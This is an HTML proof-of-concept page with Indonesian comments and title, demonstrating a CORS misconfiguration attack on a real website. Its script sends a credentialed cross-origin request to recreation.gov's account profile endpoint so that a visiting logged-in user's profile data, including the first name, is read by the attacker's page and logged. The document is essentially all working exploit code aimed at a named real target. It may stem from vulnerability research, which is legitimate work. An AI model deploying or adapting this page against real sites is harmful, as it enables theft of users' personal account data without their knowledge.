<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Cookie dengan CORS</title>
</head>
<body>
    <h1>POC - Ambil Cookie dengan CORS</h1>
    <script>
       var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.recreation.gov/account/profile", true);
xhr.withCredentials = true; // Menyertakan cookie jika ada

// Mengatur fungsi yang akan dijalankan ketika permintaan selesai
xhr.onload = function() {
    if (xhr.status === 200) {
        var data = JSON.parse(xhr.responseText); // Mengambil data dalam format JSON
        console.log('Data berhasil diambil:', data);
        
        // Menampilkan First Name ke dalam input
        const firstNameInput = document.getElementById('first-name-input');
        firstNameInput.value = data.first_name || ''; // Mengatur nilai input
    } else {
        console.error('Gagal mengambil data:', xhr.statusText);
    }
};

// Mengirim permintaan
xhr.send();



    </script>
</body>
</html>
